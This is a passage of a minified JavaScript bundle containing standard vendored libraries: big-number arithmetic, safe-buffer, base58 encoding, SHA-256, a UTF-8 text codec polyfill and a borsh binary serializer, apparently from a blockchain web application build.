>0;)(j.isOdd()||$.isOdd())&&(j.iadd(y),$.isub(V)),j.iushrn(1),$.iushrn(1);_.cmp(C)>=0?(_.isub(C),M.isub(j),R.isub($)):(C.isub(_),j.isub(M),$.isub(R))}return{a:j,b:$,gcd:C.iushln(D)}},s.prototype._invmp=function(d){r(d.negative===0),r(!d.isZero());var _=this,C=d.clone();_.negative!==0?_=_.umod(d):_=_.clone();for(var M=new s(1),R=new s(0),j=C.clone();_.cmpn(1)>0&&C.cmpn(1)>0;){for(var $=0,D=1;!(_.words[0]&D)&&$<26;++$,D<<=1);if($>0)for(_.iushrn($);$-- >0;)M.isOdd()&&M.iadd(j),M.iushrn(1);for(var y=0,V=1;!(C.words[0]&V)&&y<26;++y,V<<=1);if(y>0)for(C.iushrn(y);y-- >0;)R.isOdd()&&R.iadd(j),R.iushrn(1);_.cmp(C)>=0?(_.isub(C),M.isub(R)):(C.isub(_),R.isub(M))}var oe;return _.cmpn(1)===0?oe=M:oe=R,oe.cmpn(0)<0&&oe.iadd(d),oe},s.prototype.gcd=function(d){if(this.isZero())return d.abs();if(d.isZero())return this.abs();var _=this.clone(),C=d.clone();_.negative=0,C.negative=0;for(var M=0;_.isEven()&&C.isEven();M++)_.iushrn(1),C.iushrn(1);do{for(;_.isEven();)_.iushrn(1);for(;C.isEven();)C.iushrn(1);var R=_.cmp(C);if(R<0){var j=_;_=C,C=j}else if(R===0||C.cmpn(1)===0)break;_.isub(C)}while(!0);return C.iushln(M)},s.prototype.invm=function(d){return this.egcd(d).a.umod(d)},s.prototype.isEven=function(){return(this.words[0]&1)===0},s.prototype.isOdd=function(){return(this.words[0]&1)===1},s.prototype.andln=function(d){return this.words[0]&d},s.prototype.bincn=function(d){r(typeof d=="number");var _=d%26,C=(d-_)/26,M=1<<_;if(this.length<=C)return this._expand(C+1),this.words[C]|=M,this;for(var R=M,j=C;R!==0&&j<this.length;j++){var $=this.words[j]|0;$+=R,R=$>>>26,$&=67108863,this.words[j]=$}return R!==0&&(this.words[j]=R,this.length++),this},s.prototype.isZero=function(){return this.length===1&&this.words[0]===0},s.prototype.cmpn=function(d){var _=d<0;if(this.negative!==0&&!_)return-1;if(this.negative===0&&_)return 1;this._strip();var C;if(this.length>1)C=1;else{_&&(d=-d),r(d<=67108863,"Number is too big");var M=this.words[0]|0;C=M===d?0:M<d?-1:1}return this.negative!==0?-C|0:C},s.prototype.cmp=function(d){if(this.negative!==0&&d.negative===0)return-1;if(this.negative===0&&d.negative!==0)return 1;var _=this.ucmp(d);return this.negative!==0?-_|0:_},s.prototype.ucmp=function(d){if(this.length>d.length)return 1;if(this.length<d.length)return-1;for(var _=0,C=this.length-1;C>=0;C--){var M=this.words[C]|0,R=d.words[C]|0;if(M!==R){M<R?_=-1:M>R&&(_=1);break}}return _},s.prototype.gtn=function(d){return this.cmpn(d)===1},s.prototype.gt=function(d){return this.cmp(d)===1},s.prototype.gten=function(d){return this.cmpn(d)>=0},s.prototype.gte=function(d){return this.cmp(d)>=0},s.prototype.ltn=function(d){return this.cmpn(d)===-1},s.prototype.lt=function(d){return this.cmp(d)===-1},s.prototype.lten=function(d){return this.cmpn(d)<=0},s.prototype.lte=function(d){return this.cmp(d)<=0},s.prototype.eqn=function(d){return this.cmpn(d)===0},s.prototype.eq=function(d){return this.cmp(d)===0},s.red=function(d){return new W(d)},s.prototype.toRed=function(d){return r(!this.red,"Already a number in reduction context"),r(this.negative===0,"red works only with positives"),d.convertTo(this)._forceRed(d)},s.prototype.fromRed=function(){return r(this.red,"fromRed works only with numbers in reduction context"),this.red.convertFrom(this)},s.prototype._forceRed=function(d){return this.red=d,this},s.prototype.forceRed=function(d){return r(!this.red,"Already a number in reduction context"),this._forceRed(d)},s.prototype.redAdd=function(d){return r(this.red,"redAdd works only with red numbers"),this.red.add(this,d)},s.prototype.redIAdd=function(d){return r(this.red,"redIAdd works only with red numbers"),this.red.iadd(this,d)},s.prototype.redSub=function(d){return r(this.red,"redSub works only with red numbers"),this.red.sub(this,d)},s.prototype.redISub=function(d){return r(this.red,"redISub works only with red numbers"),this.red.isub(this,d)},s.prototype.redShl=function(d){return r(this.red,"redShl works only with red numbers"),this.red.shl(this,d)},s.prototype.redMul=function(d){return r(this.red,"redMul works only with red numbers"),this.red._verify2(this,d),this.red.mul(this,d)},s.prototype.redIMul=function(d){return r(this.red,"redMul works only with red numbers"),this.red._verify2(this,d),this.red.imul(this,d)},s.prototype.redSqr=function(){return r(this.red,"redSqr works only with red numbers"),this.red._verify1(this),this.red.sqr(this)},s.prototype.redISqr=function(){return r(this.red,"redISqr works only with red numbers"),this.red._verify1(this),this.red.isqr(this)},s.prototype.redSqrt=function(){return r(this.red,"redSqrt works only with red numbers"),this.red._verify1(this),this.red.sqrt(this)},s.prototype.redInvm=function(){return r(this.red,"redInvm works only with red numbers"),this.red._verify1(this),this.red.invm(this)},s.prototype.redNeg=function(){return r(this.red,"redNeg works only with red numbers"),this.red._verify1(this),this.red.neg(this)},s.prototype.redPow=function(d){return r(this.red&&!d.red,"redPow(normalNum)"),this.red._verify1(this),this.red.pow(this,d)};var H={k256:null,p224:null,p192:null,p25519:null};function q(T,d){this.name=T,this.p=new s(d,16),this.n=this.p.bitLength(),this.k=new s(1).iushln(this.n).isub(this.p),this.tmp=this._tmp()}q.prototype._tmp=function(){var d=new s(null);return d.words=new Array(Math.ceil(this.n/13)),d},q.prototype.ireduce=function(d){var _=d,C;do this.split(_,this.tmp),_=this.imulK(_),_=_.iadd(this.tmp),C=_.bitLength();while(C>this.n);var M=C<this.n?-1:_.ucmp(this.p);return M===0?(_.words[0]=0,_.length=1):M>0?_.isub(this.p):_.strip!==void 0?_.strip():_._strip(),_},q.prototype.split=function(d,_){d.iushrn(this.n,0,_)},q.prototype.imulK=function(d){return d.imul(this.k)};function L(){q.call(this,"k256","ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")}i(L,q),L.prototype.split=function(d,_){for(var C=4194303,M=Math.min(d.length,9),R=0;R<M;R++)_.words[R]=d.words[R];if(_.length=M,d.length<=9){d.words[0]=0,d.length=1;return}var j=d.words[9];for(_.words[_.length++]=j&C,R=10;R<d.length;R++){var $=d.words[R]|0;d.words[R-10]=($&C)<<4|j>>>22,j=$}j>>>=22,d.words[R-10]=j,j===0&&d.length>10?d.length-=10:d.length-=9},L.prototype.imulK=function(d){d.words[d.length]=0,d.words[d.length+1]=0,d.length+=2;for(var _=0,C=0;C<d.length;C++){var M=d.words[C]|0;_+=M*977,d.words[C]=_&67108863,_=M*64+(_/67108864|0)}return d.words[d.length-1]===0&&(d.length--,d.words[d.length-1]===0&&d.length--),d};function N(){q.call(this,"p224","ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")}i(N,q);function B(){q.call(this,"p192","ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")}i(B,q);function z(){q.call(this,"25519","7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")}i(z,q),z.prototype.imulK=function(d){for(var _=0,C=0;C<d.length;C++){var M=(d.words[C]|0)*19+_,R=M&67108863;M>>>=26,d.words[C]=R,_=M}return _!==0&&(d.words[d.length++]=_),d},s._prime=function(d){if(H[d])return H[d];var _;if(d==="k256")_=new L;else if(d==="p224")_=new N;else if(d==="p192")_=new B;else if(d==="p25519")_=new z;else throw new Error("Unknown prime "+d);return H[d]=_,_};function W(T){if(typeof T=="string"){var d=s._prime(T);this.m=d.p,this.prime=d}else r(T.gtn(1),"modulus must be greater than 1"),this.m=T,this.prime=null}W.prototype._verify1=function(d){r(d.negative===0,"red works only with positives"),r(d.red,"red works only with red numbers")},W.prototype._verify2=function(d,_){r((d.negative|_.negative)===0,"red works only with positives"),r(d.red&&d.red===_.red,"red works only with red numbers")},W.prototype.imod=function(d){return this.prime?this.prime.ireduce(d)._forceRed(this):(h(d,d.umod(this.m)._forceRed(this)),d)},W.prototype.neg=function(d){return d.isZero()?d.clone():this.m.sub(d)._forceRed(this)},W.prototype.add=function(d,_){this._verify2(d,_);var C=d.add(_);return C.cmp(this.m)>=0&&C.isub(this.m),C._forceRed(this)},W.prototype.iadd=function(d,_){this._verify2(d,_);var C=d.iadd(_);return C.cmp(this.m)>=0&&C.isub(this.m),C},W.prototype.sub=function(d,_){this._verify2(d,_);var C=d.sub(_);return C.cmpn(0)<0&&C.iadd(this.m),C._forceRed(this)},W.prototype.isub=function(d,_){this._verify2(d,_);var C=d.isub(_);return C.cmpn(0)<0&&C.iadd(this.m),C},W.prototype.shl=function(d,_){return this._verify1(d),this.imod(d.ushln(_))},W.prototype.imul=function(d,_){return this._verify2(d,_),this.imod(d.imul(_))},W.prototype.mul=function(d,_){return this._verify2(d,_),this.imod(d.mul(_))},W.prototype.isqr=function(d){return this.imul(d,d.clone())},W.prototype.sqr=function(d){return this.mul(d,d)},W.prototype.sqrt=function(d){if(d.isZero())return d.clone();var _=this.m.andln(3);if(r(_%2===1),_===3){var C=this.m.add(new s(1)).iushrn(2);return this.pow(d,C)}for(var M=this.m.subn(1),R=0;!M.isZero()&&M.andln(1)===0;)R++,M.iushrn(1);r(!M.isZero());var j=new s(1).toRed(this),$=j.redNeg(),D=this.m.subn(1).iushrn(1),y=this.m.bitLength();for(y=new s(2*y*y).toRed(this);this.pow(y,D).cmp($)!==0;)y.redIAdd($);for(var V=this.pow(y,M),oe=this.pow(d,M.addn(1).iushrn(1)),le=this.pow(d,M),he=R;le.cmp(j)!==0;){for(var ke=le,Te=0;ke.cmp(j)!==0;Te++)ke=ke.redSqr();r(Te<he);var Ne=this.pow(V,new s(1).iushln(he-Te-1));oe=oe.redMul(Ne),V=Ne.redSqr(),le=le.redMul(V),he=Te}return oe},W.prototype.invm=function(d){var _=d._invmp(this.m);return _.negative!==0?(_.negative=0,this.imod(_).redNeg()):this.imod(_)},W.prototype.pow=function(d,_){if(_.isZero())return new s(1).toRed(this);if(_.cmpn(1)===0)return d.clone();var C=4,M=new Array(1<<C);M[0]=new s(1).toRed(this),M[1]=d;for(var R=2;R<M.length;R++)M[R]=this.mul(M[R-1],d);var j=M[0],$=0,D=0,y=_.bitLength()%26;for(y===0&&(y=26),R=_.length-1;R>=0;R--){for(var V=_.words[R],oe=y-1;oe>=0;oe--){var le=V>>oe&1;if(j!==M[0]&&(j=this.sqr(j)),le===0&&$===0){D=0;continue}$<<=1,$|=le,D++,!(D!==C&&(R!==0||oe!==0))&&(j=this.mul(j,M[$]),D=0,$=0)}y=26}return j},W.prototype.convertTo=function(d){var _=d.umod(this.m);return _===d?_.clone():_},W.prototype.convertFrom=function(d){var _=d.clone();return _.red=null,_},s.mont=function(d){return new K(d)};function K(T){W.call(this,T),this.shift=this.m.bitLength(),this.shift%26!==0&&(this.shift+=26-this.shift%26),this.r=new s(1).iushln(this.shift),this.r2=this.imod(this.r.sqr()),this.rinv=this.r._invmp(this.m),this.minv=this.rinv.mul(this.r).isubn(1).div(this.m),this.minv=this.minv.umod(this.r),this.minv=this.r.sub(this.minv)}i(K,W),K.prototype.convertTo=function(d){return this.imod(d.ushln(this.shift))},K.prototype.convertFrom=function(d){var _=this.imod(d.mul(this.rinv));return _.red=null,_},K.prototype.imul=function(d,_){if(d.isZero()||_.isZero())return d.words[0]=0,d.length=1,d;var C=d.imul(_),M=C.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),R=C.isub(M).iushrn(this.shift),j=R;return R.cmp(this.m)>=0?j=R.isub(this.m):R.cmpn(0)<0&&(j=R.iadd(this.m)),j._forceRed(this)},K.prototype.mul=function(d,_){if(d.isZero()||_.isZero())return new s(0)._forceRed(this);var C=d.mul(_),M=C.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),R=C.isub(M).iushrn(this.shift),j=R;return R.cmp(this.m)>=0?j=R.isub(this.m):R.cmpn(0)<0&&(j=R.iadd(this.m)),j._forceRed(this)},K.prototype.invm=function(d){var _=this.imod(d._invmp(this.m).mul(this.r2));return _._forceRed(this)}})(n,hi)})(Lw);var sb=Lw.exports;const sE=ca(sb);var C0={exports:{}};/*! safe-buffer. MIT License. Feross Aboukhadijeh <https://feross.org/opensource> */(function(n,e){var t=Le,r=t.Buffer;function i(o,a){for(var l in o)a[l]=o[l]}r.from&&r.alloc&&r.allocUnsafe&&r.allocUnsafeSlow?n.exports=t:(i(t,e),e.Buffer=s);function s(o,a,l){return r(o,a,l)}s.prototype=Object.create(r.prototype),i(r,s),s.from=function(o,a,l){if(typeof o=="number")throw new TypeError("Argument must not be a number");return r(o,a,l)},s.alloc=function(o,a,l){if(typeof o!="number")throw new TypeError("Argument must be a number");var u=r(o);return a!==void 0?typeof l=="string"?u.fill(a,l):u.fill(a):u.fill(0),u},s.allocUnsafe=function(o){if(typeof o!="number")throw new TypeError("Argument must be a number");return r(o)},s.allocUnsafeSlow=function(o){if(typeof o!="number")throw new TypeError("Argument must be a number");return t.SlowBuffer(o)}})(C0,C0.exports);var ob=C0.exports,Jh=ob.Buffer;function F4(n){if(n.length>=255)throw new TypeError("Alphabet too long");for(var e=new Uint8Array(256),t=0;t<e.length;t++)e[t]=255;for(var r=0;r<n.length;r++){var i=n.charAt(r),s=i.charCodeAt(0);if(e[s]!==255)throw new TypeError(i+" is ambiguous");e[s]=r}var o=n.length,a=n.charAt(0),l=Math.log(o)/Math.log(256),u=Math.log(256)/Math.log(o);function h(v){if((Array.isArray(v)||v instanceof Uint8Array)&&(v=Jh.from(v)),!Jh.isBuffer(v))throw new TypeError("Expected Buffer");if(v.length===0)return"";for(var x=0,k=0,I=0,S=v.length;I!==S&&v[I]===0;)I++,x++;for(var b=(S-I)*u+1>>>0,E=new Uint8Array(b);I!==S;){for(var U=v[I],H=0,q=b-1;(U!==0||H<k)&&q!==-1;q--,H++)U+=256*E[q]>>>0,E[q]=U%o>>>0,U=U/o>>>0;if(U!==0)throw new Error("Non-zero carry");k=H,I++}for(var L=b-k;L!==b&&E[L]===0;)L++;for(var N=a.repeat(x);L<b;++L)N+=n.charAt(E[L]);return N}function f(v){if(typeof v!="string")throw new TypeError("Expected String");if(v.length===0)return Jh.alloc(0);for(var x=0,k=0,I=0;v[x]===a;)k++,x++;for(var S=(v.length-x)*l+1>>>0,b=new Uint8Array(S);x<v.length;){var E=v.charCodeAt(x);if(E>255)return;var U=e[E];if(U===255)return;for(var H=0,q=S-1;(U!==0||H<I)&&q!==-1;q--,H++)U+=o*b[q]>>>0,b[q]=U%256>>>0,U=U/256>>>0;if(U!==0)throw new Error("Non-zero carry");I=H,x++}for(var L=S-I;L!==S&&b[L]===0;)L++;var N=Jh.allocUnsafe(k+(S-L));N.fill(0,0,k);for(var B=k;L!==S;)N[B++]=b[L++];return N}function m(v){var x=f(v);if(x)return x;throw new Error("Non-base"+o+" character")}return{encode:h,decodeUnsafe:f,decode:m}}var z4=F4,W4=z4,$4="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",H4=W4($4);const On=ca(H4),q4=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Ss=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Ts=new Uint32Array(64);class K4 extends GA{constructor(){super(64,32,8,!1),this.A=Ss[0]|0,this.B=Ss[1]|0,this.C=Ss[2]|0,this.D=Ss[3]|0,this.E=Ss[4]|0,this.F=Ss[5]|0,this.G=Ss[6]|0,this.H=Ss[7]|0}get(){const{A:e,B:t,C:r,D:i,E:s,F:o,G:a,H:l}=this;return[e,t,r,i,s,o,a,l]}set(e,t,r,i,s,o,a,l){this.A=e|0,this.B=t|0,this.C=r|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=l|0}process(e,t){for(let f=0;f<16;f++,t+=4)Ts[f]=e.getUint32(t,!1);for(let f=16;f<64;f++){const m=Ts[f-15],v=Ts[f-2],x=yi(m,7)^yi(m,18)^m>>>3,k=yi(v,17)^yi(v,19)^v>>>10;Ts[f]=k+Ts[f-7]+x+Ts[f-16]|0}let{A:r,B:i,C:s,D:o,E:a,F:l,G:u,H:h}=this;for(let f=0;f<64;f++){const m=yi(a,6)^yi(a,11)^yi(a,25),v=h+m+RP(a,l,u)+q4[f]+Ts[f]|0,k=(yi(r,2)^yi(r,13)^yi(r,22))+MP(r,i,s)|0;h=u,u=l,l=a,a=o+v|0,o=s,s=i,i=r,r=v+k|0}r=r+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,l=l+this.F|0,u=u+this.G|0,h=h+this.H|0,this.set(r,i,s,o,a,l,u,h)}roundClean(){Ts.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const R0=qA(()=>new K4);var Ln={},Xh=ob.Buffer;function G4(n){if(n.length>=255)throw new TypeError("Alphabet too long");for(var e=new Uint8Array(256),t=0;t<e.length;t++)e[t]=255;for(var r=0;r<n.length;r++){var i=n.charAt(r),s=i.charCodeAt(0);if(e[s]!==255)throw new TypeError(i+" is ambiguous");e[s]=r}var o=n.length,a=n.charAt(0),l=Math.log(o)/Math.log(256),u=Math.log(256)/Math.log(o);function h(v){if((Array.isArray(v)||v instanceof Uint8Array)&&(v=Xh.from(v)),!Xh.isBuffer(v))throw new TypeError("Expected Buffer");if(v.length===0)return"";for(var x=0,k=0,I=0,S=v.length;I!==S&&v[I]===0;)I++,x++;for(var b=(S-I)*u+1>>>0,E=new Uint8Array(b);I!==S;){for(var U=v[I],H=0,q=b-1;(U!==0||H<k)&&q!==-1;q--,H++)U+=256*E[q]>>>0,E[q]=U%o>>>0,U=U/o>>>0;if(U!==0)throw new Error("Non-zero carry");k=H,I++}for(var L=b-k;L!==b&&E[L]===0;)L++;for(var N=a.repeat(x);L<b;++L)N+=n.charAt(E[L]);return N}function f(v){if(typeof v!="string")throw new TypeError("Expected String");if(v.length===0)return Xh.alloc(0);for(var x=0,k=0,I=0;v[x]===a;)k++,x++;for(var S=(v.length-x)*l+1>>>0,b=new Uint8Array(S);x<v.length;){var E=v.charCodeAt(x);if(E>255)return;var U=e[E];if(U===255)return;for(var H=0,q=S-1;(U!==0||H<I)&&q!==-1;q--,H++)U+=o*b[q]>>>0,b[q]=U%256>>>0,U=U/256>>>0;if(U!==0)throw new Error("Non-zero carry");I=H,x++}for(var L=S-I;L!==S&&b[L]===0;)L++;var N=Xh.allocUnsafe(k+(S-L));N.fill(0,0,k);for(var B=k;L!==S;)N[B++]=b[L++];return N}function m(v){var x=f(v);if(x)return x;throw new Error("Non-base"+o+" character")}return{encode:h,decodeUnsafe:f,decode:m}}var Q4=G4,Y4=Q4,Z4="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",J4=Y4(Z4);function $i(n,e,t){return e<=n&&n<=t}function wp(n){if(n===void 0)return{};if(n===Object(n))return n;throw TypeError("Could not convert argument to dictionary")}function X4(n){for(var e=String(n),t=e.length,r=0,i=[];r<t;){var s=e.charCodeAt(r);if(s<55296||s>57343)i.push(s);else if(56320<=s&&s<=57343)i.push(65533);else if(55296<=s&&s<=56319)if(r===t-1)i.push(65533);else{var o=n.charCodeAt(r+1);if(56320<=o&&o<=57343){var a=s&1023,l=o&1023;i.push(65536+(a<<10)+l),r+=1}else i.push(65533)}r+=1}return i}function eL(n){for(var e="",t=0;t<n.length;++t){var r=n[t];r<=65535?e+=String.fromCharCode(r):(r-=65536,e+=String.fromCharCode((r>>10)+55296,(r&1023)+56320))}return e}var dd=-1;function Dw(n){this.tokens=[].slice.call(n)}Dw.prototype={endOfStream:function(){return!this.tokens.length},read:function(){return this.tokens.length?this.tokens.shift():dd},prepend:function(n){if(Array.isArray(n))for(var e=n;e.length;)this.tokens.unshift(e.pop());else this.tokens.unshift(n)},push:function(n){if(Array.isArray(n))for(var e=n;e.length;)this.tokens.push(e.shift());else this.tokens.push(n)}};var kl=-1;function Hg(n,e){if(n)throw TypeError("Decoder error");return e||65533}var pd="utf-8";function gd(n,e){if(!(this instanceof gd))return new gd(n,e);if(n=n!==void 0?String(n).toLowerCase():pd,n!==pd)throw new Error("Encoding not supported. Only utf-8 is supported");e=wp(e),this._streaming=!1,this._BOMseen=!1,this._decoder=null,this._fatal=!!e.fatal,this._ignoreBOM=!!e.ignoreBOM,Object.defineProperty(this,"encoding",{value:"utf-8"}),Object.defineProperty(this,"fatal",{value:this._fatal}),Object.defineProperty(this,"ignoreBOM",{value:this._ignoreBOM})}gd.prototype={decode:function(e,t){var r;typeof e=="object"&&e instanceof ArrayBuffer?r=new Uint8Array(e):typeof e=="object"&&"buffer"in e&&e.buffer instanceof ArrayBuffer?r=new Uint8Array(e.buffer,e.byteOffset,e.byteLength):r=new Uint8Array(0),t=wp(t),this._streaming||(this._decoder=new tL({fatal:this._fatal}),this._BOMseen=!1),this._streaming=!!t.stream;for(var i=new Dw(r),s=[],o;!i.endOfStream()&&(o=this._decoder.handler(i,i.read()),o!==kl);)o!==null&&(Array.isArray(o)?s.push.apply(s,o):s.push(o));if(!this._streaming){do{if(o=this._decoder.handler(i,i.read()),o===kl)break;o!==null&&(Array.isArray(o)?s.push.apply(s,o):s.push(o))}while(!i.endOfStream());this._decoder=null}return s.length&&["utf-8"].indexOf(this.encoding)!==-1&&!this._ignoreBOM&&!this._BOMseen&&(s[0]===65279?(this._BOMseen=!0,s.shift()):this._BOMseen=!0),eL(s)}};function md(n,e){if(!(this instanceof md))return new md(n,e);if(n=n!==void 0?String(n).toLowerCase():pd,n!==pd)throw new Error("Encoding not supported. Only utf-8 is supported");e=wp(e),this._streaming=!1,this._encoder=null,this._options={fatal:!!e.fatal},Object.defineProperty(this,"encoding",{value:"utf-8"})}md.prototype={encode:function(e,t){e=e?String(e):"",t=wp(t),this._streaming||(this._encoder=new nL(this._options)),this._streaming=!!t.stream;for(var r=[],i=new Dw(X4(e)),s;!i.endOfStream()&&(s=this._encoder.handler(i,i.read()),s!==kl);)Array.isArray(s)?r.push.apply(r,s):r.push(s);if(!this._streaming){for(;s=this._encoder.handler(i,i.read()),s!==kl;)Array.isArray(s)?r.push.apply(r,s):r.push(s);this._encoder=null}return new Uint8Array(r)}};function tL(n){var e=n.fatal,t=0,r=0,i=0,s=128,o=191;this.handler=function(a,l){if(l===dd&&i!==0)return i=0,Hg(e);if(l===dd)return kl;if(i===0){if($i(l,0,127))return l;if($i(l,194,223))i=1,t=l-192;else if($i(l,224,239))l===224&&(s=160),l===237&&(o=159),i=2,t=l-224;else if($i(l,240,244))l===240&&(s=144),l===244&&(o=143),i=3,t=l-240;else return Hg(e);return t=t<<6*i,null}if(!$i(l,s,o))return t=i=r=0,s=128,o=191,a.prepend(l),Hg(e);if(s=128,o=191,r+=1,t+=l-128<<6*(i-r),r!==i)return null;var u=t;return t=i=r=0,u}}function nL(n){n.fatal,this.handler=function(e,t){if(t===dd)return kl;if($i(t,0,127))return t;var r,i;$i(t,128,2047)?(r=1,i=192):$i(t,2048,65535)?(r=2,i=224):$i(t,65536,1114111)&&(r=3,i=240);for(var s=[(t>>6*r)+i];r>0;){var o=t>>6*(r-1);s.push(128|o&63),r-=1}return s}}const rL=Object.freeze(Object.defineProperty({__proto__:null,TextDecoder:gd,TextEncoder:md},Symbol.toStringTag,{value:"Module"})),iL=Ry(rL);var sL=hi&&hi.__createBinding||(Object.create?function(n,e,t,r){r===void 0&&(r=t),Object.defineProperty(n,r,{enumerable:!0,get:function(){return e[t]}})}:function(n,e,t,r){r===void 0&&(r=t),n[r]=e[t]}),oL=hi&&hi.__setModuleDefault||(Object.create?function(n,e){Object.defineProperty(n,"default",{enumerable:!0,value:e})}:function(n,e){n.default=e}),Mi=hi&&hi.__decorate||function(n,e,t,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,t):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(n,e,t,r);else for(var a=n.length-1;a>=0;a--)(o=n[a])&&(s=(i<3?o(s):i>3?o(e,t,s):o(e,t))||s);return i>3&&s&&Object.defineProperty(e,t,s),s},aL=hi&&hi.__importStar||function(n){if(n&&n.__esModule)return n;var e={};if(n!=null)for(var t in n)t!=="default"&&Object.hasOwnProperty.call(n,t)&&sL(e,n,t);return oL(e,n),e},ab=hi&&hi.__importDefault||function(n){return n&&n.__esModule?n:{default:n}};Object.defineProperty(Ln,"__esModule",{value:!0});var lb=Ln.deserializeUnchecked=pb=Ln.deserialize=db=Ln.serialize=Ln.BinaryReader=Ln.BinaryWriter=Ln.BorshError=Ln.baseDecode=Ln.baseEncode=void 0;const Us=ab(sb),cb=ab(J4),lL=aL(iL),cL=typeof TextDecoder!="function"?lL.TextDecoder:TextDecoder,uL=new cL("utf-8",{fatal:!0});function hL(n){return typeof n=="string"&&(n=Buffer.from(n,"utf8")),cb.default.encode(Buffer.from(n))}Ln.baseEncode=hL;function fL(n){return Buffer.from(cb.default.decode(n))}Ln.baseDecode=fL;const qg=1024;class ir extends Error{constructor(e){super(e),this.fieldPath=[],this.originalMessage=e}addToFieldPath(e){this.fieldPath.splice(0,0,e),this.message=this.originalMessage+": "+this.fieldPath.join(".")}}Ln.BorshError=ir;class ub{constructor(){this.buf=Buffer.alloc(qg),this.length=0}maybeResize(){this.buf.length<16+this.length&&(this.buf=Buffer.concat([this.buf,Buffer.alloc(qg)]))}writeU8(e){this.maybeResize(),this.buf.writeUInt8(e,this.length),this.length+=1}writeU16(e){this.maybeResize(),this.buf.writeUInt16LE(e,this.length),this.length+=2}writeU32(e){this.maybeResize(),this.buf.writeUInt32LE(e,this.length),this.length+=4}writeU64(e){this.maybeResize(),this.writeBuffer(Buffer.from(new Us.default(e).toArray("le",8)))}writeU128(e){this.maybeResize(),this.writeBuffer(Buffer.from(new Us.default(e).toArray("le",16)))}writeU256(e){this.maybeResize(),this.writeBuffer(Buffer.from(new Us.default(e).toArray("le",32)))}writeU512(e){this.maybeResize(),this.writeBuffer(Buffer.from(new Us.default(e).toArray("le",64)))}writeBuffer(e){this.buf=Buffer.concat([Buffer.from(this.buf.subarray(0,this.length)),e,Buffer.alloc(qg)]),this.length+=e.length}writeString(e){this.maybeResize();const t=Buffer.from(e,"utf8");this.writeU32(t.length),this.writeBuffer(t)}writeFixedArray(e){this.writeBuffer(Buffer.from(e))}writeArray(e,t){this.maybeResize(),this.writeU32(e.length);for(const r of e)this.maybeResize(),t(r)}toArray(){return this.buf.subarray(0,this.length)}}Ln.BinaryWriter=ub;function Ni(n,e,t){const r=t.value;t.value=function(...i){try{return r.apply(this,i)}catch(s){if(s instanceof RangeError){const o=s.code;if(["ERR_BUFFER_OUT_OF_BOUNDS","ERR_OUT_OF_RANGE"].indexOf(o)>=0)throw new ir("Reached the end of buffer when deserializing")}throw s}}}class Lr{constructor(e){this.buf=e,this.offset=0}readU8(){const e=this.buf.readUInt8(this.offset);return this.offset+=1,e}readU16(){const e=this.buf.readUInt16LE(this.offset);return this.offset+=2,e}readU32(){const e=this.buf.readUInt32LE(this.offset);return this.offset+=4,e}readU64(){const e=this.readBuffer(8);return new Us.default(e,"le")}readU128(){const e=this.readBuffer(16);return new Us.default(e,"le")}readU256(){const e=this.readBuffer(32);return new Us.default(e,"le")}readU512(){const e=this.readBuffer(64);return new Us.default(e,"le")}readBuffer(e){if(this.offset+e>this.buf.length)throw new ir(`Expected buffer length ${e} isn't within bounds`);const t=this.buf.slice(this.offset,this.offset+e);return this.offset+=e,t}readString(){const e=this.readU32(),t=this.readBuffer(e);try{return uL.decode(t)}catch(r){throw new ir(`Error decoding UTF-8 string: ${r}`)}}readFixedArray(e){return new Uint8Array(this.readBuffer(e))}readArray(e){const t=this.readU32(),r=Array();for(let i=0;i<t;++i)r.push(e());return r}}Mi([Ni],Lr.prototype,"readU8",null);Mi([Ni],Lr.prototype,"readU16",null);Mi([Ni],Lr.prototype,"readU32",null);Mi([Ni],Lr.prototype,"readU64",null);Mi([Ni],Lr.prototype,"readU128",null);Mi([Ni],Lr.prototype,"readU256",null);Mi([Ni],Lr.prototype,"readU512",null);Mi([Ni],Lr.prototype,"readString",null);Mi([Ni],Lr.prototype,"readFixedArray",null);Mi([Ni],Lr.prototype,"readArray",null);Ln.BinaryReader=Lr;function hb(n){return n.charAt(0).toUpperCase()+n.slice(1)}function Do(n,e,t,r,i){try{if(typeof r=="string")i[`write${hb(r)}`](t);else if(r instanceof Array)if(typeof r[0]=="number"){if(t.length!==r[0])throw new ir(`Expecting byte array of length ${r[0]}, but got ${t.length} bytes`);i.writeFixedArray(t)}else if(r.length===2&&typeof r[1]=="number"){if(t.length!==r[1])throw new ir(`Expecting byte array of length ${r[1]}, but got ${t.length} bytes`);for(let s=0;s<r[1];s++)Do(n,null,t[s],r[0],i)}else i.writeArray(t,s=>{Do(n,e,s,r[0],i)});else if(r.kind!==void 0)switch(r.kind){case"option":{t==null?i.writeU8(0):(i.writeU8(1),Do(n,e,t,r.type,i));break}case"map":{i.writeU32(t.size),t.forEach((s,o)=>{Do(n,e,o,r.key,i),Do(n,e,s,r.value,i)});break}default:throw new ir(`FieldType ${r} unrecognized`)}else fb(n,t,i)}catch(s){throw s 